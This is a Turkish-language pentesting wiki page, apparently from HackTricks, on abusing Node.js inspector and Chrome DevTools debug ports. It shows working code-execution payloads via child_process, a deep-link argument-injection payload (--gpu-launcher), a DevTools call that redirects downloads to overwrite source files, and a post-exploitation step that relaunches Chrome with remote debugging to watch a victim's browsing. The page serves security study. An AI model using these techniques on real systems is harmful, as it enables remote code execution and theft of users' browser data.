# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

[Dokümantasyondan](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` switch'i ile başlatıldığında bir Node.js process'i debugging client'ını dinler. **Varsayılan olarak**, **`127.0.0.1:9229`** host ve port'unda dinleme yapar. Her process'e ayrıca **benzersiz** bir **UUID** atanır.<sup>[[4]](#references)</sup>

Inspector client'ları bağlanmak için host adresini, port'u ve UUID'yi bilmeli ve belirtmelidir. Tam URL yaklaşık olarak şu şekilde görünür: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> **Debugger, Node.js execution environment'a tam erişime sahip olduğundan**, bu port'a bağlanabilen kötü niyetli bir actor, Node.js process'i adına arbitrary code execute edebilir (**potential privilege escalation**).

Bir inspector başlatmanın çeşitli yolları vardır:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
İncelenen bir process'i başlattığınızda buna benzer bir şey görünür:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) tabanlı süreçler, **debugger**'ı açmak için `--remote-debugging-port=9222` parametresini kullanmalıdır (SSRF korumaları büyük ölçüde aynı kalır). Ancak bunlar bir **NodeJS** **debug** oturumu sağlamak yerine, browser ile [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) kullanarak iletişim kurar. Bu, browser'ı kontrol etmek için kullanılan bir arayüzdür, ancak doğrudan bir RCE yoktur.<sup>[[5]](#references)</sup>

Debug etkinleştirilmiş bir browser başlattığınızda şöyle bir şey görünür:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Tarayıcılar, WebSockets ve same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Bir web-browser'da açılan web siteleri, browser security model kapsamında WebSocket ve HTTP istekleri gönderebilir. **Benzersiz bir debugger session id elde etmek** için **initial HTTP connection** gereklidir. **same-origin-policy**, web sitelerinin **bu HTTP connection'ı** kurabilmesini **engeller**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** saldırılarına karşı ek güvenlik sağlamak amacıyla Node.js, connection için **'Host' headers** değerlerinin tam olarak bir **IP address**, **`localhost`** veya **`localhost6`** belirtip belirtmediğini doğrular.<sup>[[12]](#references)</sup>

> [!TIP]
> Bu **security measure**, **inspector**'ı **sadece bir HTTP request göndererek** (SSRF vuln exploit edilerek yapılabilir) code çalıştırmak için exploit etmeyi engeller.

### Çalışan process'lerde inspector'ı başlatma

Çalışan bir nodejs process'ine **SIGUSR1** signal'ini göndererek **inspector**'ın default port üzerinde **başlamasını** sağlayabilirsiniz. Ancak yeterli privileges'a sahip olmanız gerektiğini unutmayın; bu işlem size **process içindeki bilgilere privileged access** sağlayabilir, ancak doğrudan bir privilege escalation sağlamaz.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Bu, container'larda kullanışlıdır çünkü `--inspect` ile **process'i kapatıp yeni bir process başlatmak** bir seçenek değildir; process ile birlikte **container** da **killed** olur.

### inspector/debugger'a bağlanma

Bir **Chromium-tabanlı tarayıcıya** bağlanmak için Chrome veya Edge'de sırasıyla `chrome://inspect` ya da `edge://inspect` URL'lerine erişilebilir. Configure düğmesine tıklayarak **hedef host ve portun** doğru şekilde listelendiğinden emin olunmalıdır. Görselde bir Remote Code Execution (RCE) örneği gösterilmektedir:

![Debugger'a erişmek için bir URL görünecektir. örn. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger'a bağlanma: Bir Chromium-tabanlı tarayıcıya bağlanmak için...](<../../images/image (674).png>)

**command line** kullanarak bir debugger/inspector'a şu şekilde bağlanabilirsiniz:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) aracı, yerel olarak çalışan **inspector'ları bulmaya** ve bunlara **code inject etmeye** olanak tanır.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden bir browser'a bağlanıldığında **NodeJS RCE exploit'lerinin çalışmayacağını** unutmayın (bu protokolle yapılabilecek ilginç şeyleri bulmak için API'yi kontrol etmeniz gerekir).

## NodeJS Debugger/Inspector'da RCE

> [!TIP]
> Buraya Electron'da bir XSS'ten [**RCE elde etmenin nasıl yapılacağını öğrenmek için geldiyseniz bu sayfaya bakın.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Bir Node **inspector**'ına **bağlanabildiğinizde** **RCE** elde etmenin yaygın yollarından biri aşağıdakine benzer bir yöntem kullanmaktır (görünen o ki bu yöntem **Chrome DevTools protocol'e yapılan bir bağlantıda çalışmayacaktır**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API'yi buradan kontrol edebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
Bu bölümde, insanların bu protocol'ü exploit etmek için kullandığını gördüğüm ilginç şeyleri listeleyeceğim.

### Deep Links Üzerinden Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) üzerinde Rhino security, CEF tabanlı bir application'ın sistemde **özel bir UR**I** kaydettiğini (workspaces://index.html), full URI'yi aldığını ve ardından CEF tabanlı applicatio**n**'ı bu URI'den kısmen oluşturulan bir configuration ile **başlattığını** keşfetti.<sup>[[8]](#references)</sup>

URI parameter'larının URL decoded olduğu ve CEF tabanlı application'ı başlatmak için kullanıldığı keşfedildi. Bu da bir kullanıcının **`--gpu-launcher`** flag'ini **command line**'a **inject** etmesine ve keyfi şeyler execute etmesine olanak sağlıyordu.

Dolayısıyla aşağıdaki gibi bir payload:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Bir calc.exe çalıştıracaktır.

### Dosyaların Üzerine Yazma

**indirilen dosyaların kaydedileceği** klasörü değiştirin ve uygulamanın sık kullanılan **source code** dosyalarından birinin üzerine **malicious code** yazmak için bir dosya indirin.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE ve exfiltration

Bu gönderiye göre: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) theriver'dan RCE elde etmek ve dahili sayfaları exfiltrate etmek mümkündür.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

Gerçek bir ortamda, **Chrome/Chromium tabanlı browser kullanan bir kullanıcı bilgisayarını compromise ettikten sonra**, **debugging etkinleştirilmiş ve debugging portu port-forward edilmiş** bir Chrome process'i başlatarak ona erişebilirsiniz. Bu şekilde **victim'ın Chrome ile yaptığı her şeyi inspect edebilir ve hassas bilgileri çalabilirsiniz**.<sup>[[7]](#references)</sup>

Stealth yöntemi, **her Chrome process'ini terminate etmek** ve ardından buna benzer bir şey çağırmaktır:
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referanslar

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger üzerinden Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusing Chrome's Debugging Feature to Observe and Control Browsing Sessions Remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
